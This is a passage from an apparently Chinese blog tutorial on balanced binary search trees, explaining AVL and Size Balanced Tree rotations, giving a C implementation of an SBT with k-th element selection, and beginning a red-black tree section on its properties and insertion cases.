src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-26-22-5673fe.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/11-26-45-79c480.png" srcset="/img/loading.gif" lazyload style="zoom:50%;"></p><h4><span id="旋转的触发">旋转的触发</span></h4><p>在插入一个元素后不断回溯的过程中，如果因此导致结点不平衡，则根据不平衡情况（一定是一边子树比另一边子树的高度大2）进行对应的旋转：</p><ol type="1"><li>左子树比右子树的高度大 2：</li></ol><ul><li><p>如果新增元素插入到左儿子的左子树中，则进行右旋操作。( <strong>LL型调整</strong> )</p></li><li><p>如果新增元素插入到左儿子的右子树中，则进行左旋加右旋操作。（<strong>LR 型调整</strong> ）</p><ol start="2" type="1"><li>右子树比左子树的高度大 2：</li></ol></li><li><p>如果新增元素插入到右儿子的右子树中，则进行左旋操作。（ <strong>RR型调整</strong> ）</p></li><li><p>如果新增元素插入到右儿子的左子树中，则进行右旋加左旋操作。（<strong>RL 型调整</strong> ）</p></li></ul><p>类似的，在删除一个元素后不断回溯的过程中，如果出现结点不平衡，则和插入操作采用相同的调整操作，确保在删除以后整棵树依然是平衡的。</p><h3><span id="size-balanced-tree">Size Balanced Tree</span></h3><p>对于 SBT，它的自平衡条件会显得稍微复杂一些：对于每个结点<em>t</em>，同时满足： $$size[right[t]]≥max(size[left[left[t]]],size[right[left[t]]]) \</p><p>size[left[t]]≥max(size[left[right[t]]],size[right[right[t]]]) $$size表示以该节点为根的子树中节点个数。</p><p>每个结点所在子树的结点个数，不小于其兄弟的两个孩子所在子树的结点个数的最大值。</p><p>旋转操作和 AVL 树的左旋右旋是完全一样的。</p><p>只是旋转的触发条件不同。</p><h4><span id="旋转的触发">旋转的触发</span></h4><p>在调整过程中，一共有 4 种会触发旋转的情况：</p><ol type="1"><li>LL 型（ size[left[left[t]]] &gt; size[right[t]] ）：首先对子树<em>t</em> 执行右旋操作，旋转以后对 <em>t</em>的右子树进行调整，之后再对子树 <em>t</em> 进行调整。</li><li>LR 型（ size[right[left[t]]] &gt; size[right[t]] ）：首先对<em>t</em> 的左子树执行左旋操作，再对 <em>t</em>进行右旋操作。之后分别调整结点 <em>t</em> 的左右子树，最终对结点<em>t</em>进行调整。</li><li>RR 型（ size[right[right[t]]] &gt; size[left[t]] ）：首先对<em>t</em> 执行左旋操作，旋转以后对 <em>t</em>的左子树进行调整，之后再对 <em>t</em> 进行调整。</li><li>RL 型（ size[left[right[t]]] &gt; size[left[t]] ）：首先对结点<em>t</em> 的右子树执行右旋操作，再对 <em>t</em>进行左旋操作。之后分别调整 <em>t</em> 的左右子树，最终对 <em>t</em>进行调整。</li></ol><p>通过递归的进行调整，让不平衡的 SBTree 恢复平衡状态。</p><p>简化流程：</p><blockquote><ol type="1"><li>如果在处理左子树更高的情况：<ol type="1"><li>LL 型：右旋 <em>t</em>。</li><li>LR 型：左旋 <em>t</em> 的左子树，再右旋 <em>t</em>。</li></ol></li><li>如果在处理右子树更高的情况：<ol type="1"><li>RR 型：左旋 <em>t</em>。</li><li>RL 型：右旋 <em>t</em> 的右子树，再左旋 <em>t</em>。</li></ol></li><li>递归调整左子树中左子树的左子树更高的情况。</li><li>递归调整右子树中右子树的右子树更高的情况。</li><li>递归调整当前子树中左子树更高的情况。</li><li>递归调整当前子树中右子树更高的情况。</li></ol></blockquote><p>和 AVL 不太一样的是，SBTree只有在插入时才可能触发调整，而<strong>不需要在删除结点以后进行调整</strong>。</p><p>从理论上说，SBTree 和 AVL树相比在均摊时间复杂度上没有区别，每次查询、插入和删除的时间复杂度都为<span class="math inline">\(O(\log(n))\)</span>。</p><p>在实际运用中，SBTree在查询操作较多的情况下会有效率上的优势。加之为了维护平衡性记录了每个结点所在子树大小（即子树内结点个数），相比其他平衡二叉查找树而言，更便于求解第<em>k</em> 大元素、或求解元素的秩（rank）等类似问题。</p><h4><span id="实现">实现</span></h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SBTNode</span> &#123;</span><br>    <span class="hljs-keyword">int</span> data, <span class="hljs-built_in">size</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SBTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>, *<span class="hljs-title">father</span>;</span><br>&#125;SBTNode;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> init_data, <span class="hljs-keyword">int</span> init_size, SBTNode *init_father)</span></span>;<br><br>SBTNode *NIL;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_NIL</span><span class="hljs-params">()</span> </span>&#123;<br>    NIL = (SBTNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SBTNode));<br>    NIL-&gt;data = <span class="hljs-number">0</span>;<br>    NIL-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-number">0</span>;<br>    NIL-&gt;lchild = NIL;<br>    NIL-&gt;rchild = NIL;<br>    NIL-&gt;father = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-keyword">int</span> init_data, <span class="hljs-keyword">int</span> init_size, SBTNode *init_father)</span> </span>&#123;<br>    SBTNode *node = (SBTNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(SBTNode));<br>    node-&gt;data = init_data;<br>    node-&gt;<span class="hljs-built_in">size</span> = init_size;<br>    node-&gt;lchild = NIL;<br>    node-&gt;rchild = NIL;<br>    node-&gt;father = init_father;<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-comment">// 左旋实现，复杂一点的链表指向关系转移</span><br><span class="hljs-function">SBTNode* <span class="hljs-title">left_rotate</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    SBTNode *temp = node-&gt;rchild;<br>    node-&gt;rchild = temp-&gt;lchild;<br>    temp-&gt;lchild-&gt;father = node;<br>    temp-&gt;lchild = node;<br>    temp-&gt;father = node-&gt;father;<br>    node-&gt;father = temp;<br>    temp-&gt;<span class="hljs-built_in">size</span> = node-&gt;<span class="hljs-built_in">size</span>;<br>    node-&gt;<span class="hljs-built_in">size</span> = node-&gt;lchild-&gt;<span class="hljs-built_in">size</span> + node-&gt;rchild-&gt;<span class="hljs-built_in">size</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-comment">// 右旋实现，旋转操作的根节点为node</span><br><span class="hljs-function">SBTNode* <span class="hljs-title">right_rotate</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    SBTNode *temp = node-&gt;lchild;<br>    node-&gt;lchild = temp-&gt;rchild;<br>    temp-&gt;rchild-&gt;father = node;<br>    temp-&gt;rchild = node;<br>    temp-&gt;father = node-&gt;father;<br>    node-&gt;father = temp;<br>    temp-&gt;<span class="hljs-built_in">size</span> = node-&gt;<span class="hljs-built_in">size</span>;<br>    node-&gt;<span class="hljs-built_in">size</span> = node-&gt;lchild-&gt;<span class="hljs-built_in">size</span> + node-&gt;rchild-&gt;<span class="hljs-built_in">size</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-comment">// 递归调整平衡二叉树，以size为对比标准，flag指示子树哪一边size更大</span><br><span class="hljs-function">SBTNode* <span class="hljs-title">maintain</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> flag)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (flag == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 左子树中左子树size 大于 node的右子树，LL情况，使用右旋调整</span><br>        <span class="hljs-keyword">if</span> (node-&gt;lchild-&gt;lchild-&gt;<span class="hljs-built_in">size</span> &gt; node-&gt;rchild-&gt;<span class="hljs-built_in">size</span>) &#123;<br>            node = right_rotate(node);<br>        &#125; <br>        <span class="hljs-comment">// LR, 先左旋再右旋</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node-&gt;lchild-&gt;rchild-&gt;<span class="hljs-built_in">size</span> &gt; node-&gt;rchild-&gt;<span class="hljs-built_in">size</span>) &#123;<br>            node-&gt;lchild = left_rotate(node-&gt;lchild);<br>            node = right_rotate(node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> node;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// RR, 左旋</span><br>        <span class="hljs-keyword">if</span> (node-&gt;rchild-&gt;rchild-&gt;<span class="hljs-built_in">size</span> &gt; node-&gt;lchild-&gt;<span class="hljs-built_in">size</span>) &#123;<br>            node = left_rotate(node);<br>        &#125; <br>        <span class="hljs-comment">// RL，先右旋再左旋</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node-&gt;rchild-&gt;lchild-&gt;<span class="hljs-built_in">size</span> &gt; node-&gt;lchild-&gt;<span class="hljs-built_in">size</span>) &#123;<br>            node-&gt;rchild = right_rotate(node-&gt;rchild);<br>            node = left_rotate(node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> node;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 递归处理左右子树</span><br>    node-&gt;lchild = <span class="hljs-built_in">maintain</span>(node-&gt;lchild, <span class="hljs-number">0</span>);<br>    node-&gt;rchild = <span class="hljs-built_in">maintain</span>(node-&gt;rchild, <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 当子树调整后，再处理 node 的平衡</span><br>    node = <span class="hljs-built_in">maintain</span>(node, <span class="hljs-number">0</span>);<br>    node = <span class="hljs-built_in">maintain</span>(node, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">insert</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    node-&gt;<span class="hljs-built_in">size</span>++;<br>    <span class="hljs-keyword">if</span> (value &gt; node-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild == NIL) &#123;<br>            node-&gt;rchild = init(value, <span class="hljs-number">1</span>, node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            node-&gt;rchild = insert(node-&gt;rchild, value);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild == NIL) &#123;<br>            node-&gt;lchild = init(value, <span class="hljs-number">1</span>, node);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            node-&gt;lchild = insert(node-&gt;lchild, value);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">maintain</span>(node, value &gt; node-&gt;data);<br>&#125;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">search</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node == NIL || node-&gt;data == value) &#123;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value &gt; node-&gt;data) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild == NIL) &#123;<br>            <span class="hljs-keyword">return</span> NIL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> search(node-&gt;rchild, value);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild == NIL) &#123;<br>            <span class="hljs-keyword">return</span> NIL;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> search(node-&gt;lchild, value);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">insert_node</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>        node = init(value, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (search(node, value) != NIL) &#123;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br>    <span class="hljs-keyword">return</span> insert(node, value);<br>&#125;<br><br><br><span class="hljs-function">SBTNode* <span class="hljs-title">predecessor</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    SBTNode *temp = node-&gt;lchild;<br>    <span class="hljs-keyword">while</span> (temp != NIL &amp;&amp; temp-&gt;rchild != NIL) &#123;<br>        temp = temp-&gt;rchild;<br>    &#125;<br>    <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-function">SBTNode* <span class="hljs-title">successor</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    SBTNode *temp = node-&gt;rchild;<br>    <span class="hljs-keyword">while</span> (temp != NIL &amp;&amp; temp-&gt;lchild != NIL) &#123;<br>        temp = temp-&gt;lchild;<br>    &#125;<br>    <span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove_node</span><span class="hljs-params">(SBTNode *delete_node)</span> </span>&#123;<br>    SBTNode *temp = NIL;<br>    <span class="hljs-keyword">if</span> (delete_node-&gt;lchild != NIL) &#123;<br>        temp = delete_node-&gt;lchild;<br>        temp-&gt;father = delete_node-&gt;father;<br>        delete_node-&gt;lchild = NIL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (delete_node-&gt;rchild != NIL) &#123;<br>        temp = delete_node-&gt;rchild;<br>        temp-&gt;father = delete_node-&gt;father;<br>        delete_node-&gt;rchild = NIL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (delete_node-&gt;father-&gt;lchild == delete_node) &#123;<br>        delete_node-&gt;father-&gt;lchild = temp;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        delete_node-&gt;father-&gt;rchild = temp;<br>    &#125;<br>    temp = delete_node;<br>    <span class="hljs-keyword">while</span> (temp != <span class="hljs-literal">NULL</span>) &#123;<br>        temp-&gt;<span class="hljs-built_in">size</span>--;<br>        temp = temp-&gt;father;<br>    &#125;<br>    delete_node-&gt;lchild = NIL;<br>    delete_node-&gt;rchild = NIL;<br>    <span class="hljs-built_in">free</span>(delete_node);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">delete_tree</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    SBTNode *delete_node, *current_node;<br>    current_node = search(node, value);<br>    <span class="hljs-keyword">if</span> (current_node == NIL) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current_node-&gt;lchild != NIL) &#123;<br>        delete_node = predecessor(current_node);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current_node-&gt;rchild != NIL) &#123;<br>        delete_node = successor(current_node);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        delete_node = current_node;<br>    &#125;<br>    current_node-&gt;data = delete_node-&gt;data;<br>    remove_node(delete_node);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node == NIL) <span class="hljs-keyword">return</span>;<br>    inorder(node-&gt;lchild);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, node-&gt;data);<br>    inorder(node-&gt;rchild);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(SBTNode *node)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (node != NIL) &#123;<br>        <span class="hljs-keyword">if</span> (node-&gt;lchild != NIL) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;lchild);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (node-&gt;rchild != NIL) &#123;<br>            <span class="hljs-built_in">clear</span>(node-&gt;rchild);<br>        &#125;<br>        <span class="hljs-built_in">free</span>(node);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    init_NIL();<br>    SBTNode *binarytree = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> arr[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span> &#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        binarytree = insert_node(binarytree, arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">int</span> value;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>    <span class="hljs-keyword">if</span> (search(binarytree, value) != NIL) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search failed!\n"</span>);<br>    &#125;    <br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;value);<br>    <span class="hljs-keyword">if</span> (delete_tree(binarytree, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"delete success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"delete failed!\n"</span>);<br>    &#125;<br>    <span class="hljs-built_in">clear</span>(binarytree);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4><span id="求解第k小元素">求解第k小元素</span></h4><p>只需要在SBTree基础上，增加一个函数select_a。SBTree记录了树的size，所以找到某个大小的元素比较便利。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">select_a</span><span class="hljs-params">(SBTNode *node, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rank = node-&gt;lchild-&gt;<span class="hljs-built_in">size</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (rank == k) &#123;<br>        <span class="hljs-keyword">return</span> node-&gt;data;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (k &lt; rank) &#123;<br>        <span class="hljs-keyword">return</span> select_a(node-&gt;lchild, k);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> select_a(node-&gt;rchild, k - rank);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    init_NIL();<br>    SBTNode *binarytree = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> arr[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span> &#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        binarytree = insert_node(binarytree, arr[i]);<br>    &#125;<br>    <span class="hljs-keyword">int</span> k;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, select_a(binarytree, k));<br>    <span class="hljs-built_in">clear</span>(binarytree);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="rbtree">RBTree</span></h3><p><strong>红黑树（Red-Black Tree）</strong>也是一种自平衡的二叉查找树。1972 年由 Rudolf Bayer发明的，而“红黑树”的名字是由 Leo J. Guibas 和 Robert Sedgewick （写《算法》的普林斯顿大佬）于 1978 年首次提出。</p><p>红黑树相比于AVL，牺牲了部分平衡性以在插入、删除操作时减少旋转操作，整体性能优于AVL，也正因如此，C++ STL 中的 map 就是用红黑树实现的。</p><p>红黑树和其他平衡二叉查找树相比，增加了一个 <strong>颜色</strong>属性，用来标识树上的结点是红色还是黑色；并且如果一个结点没有子结点，则该结点的子节点对应的指针为NIL，也就是说，红黑树的所有叶子都是 NIL。</p><p>红黑树是满足如下条件的二叉查找树：</p><ol type="1"><li>每个结点要么是红色，要么是黑色；</li><li>根结点是黑色；</li><li>叶结点（NIL）是黑色；</li><li>如果一个结点是红色，则它的两个子节点都是黑色的；</li><li>从根结点出发到所有叶结点的路径上，均包含相同数目的黑色结点。</li></ol><p>第五条规则是红黑树平衡性的核心。</p><p>因为第四条和第五条规则的限制，使得红黑树上从根结点到每个叶结点的最长路径最多是最短路径的两倍，这也确保了整棵二叉查找树是平衡的。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/16-37-11-7c22b4.png" srcset="/img/loading.gif" lazyload alt="一个省略NIL的合法红黑树" style="zoom:50%;"></p><h4><span id="红黑树插入">红黑树插入</span></h4><p>插入分为四种情况，且插入节点默认为红色：</p><ol type="1"><li><p>新结点 <code>x</code> 位于树的根</p><p>根据第二条规则，将新结点的颜色改为黑色。</p></li><li><p><em>x</em> 的叔父结点（父节点的兄弟）是红色</p><p>此时 <em>x</em> 的祖父结点一定是黑色的。</p><p>将祖父结点的黑色改为红色，并将 <em>x</em>的父结点和叔父结点改为黑色。之后将 <em>x</em> 的祖父结点作为 <em>x</em>继续向上迭代（直到根节点）。</p></li><li><p><em>x</em> 的叔父结点是黑色的，并且 <em>x</em> 是一个右孩子</p><p>对 <em>x</em>的父结点进行左旋，原父结点仍为红色，叔父结点仍为黑色。进行第四种情况操作，且在第四种情况中，<em>x</em>代表左旋前的父节点。</p><p><img 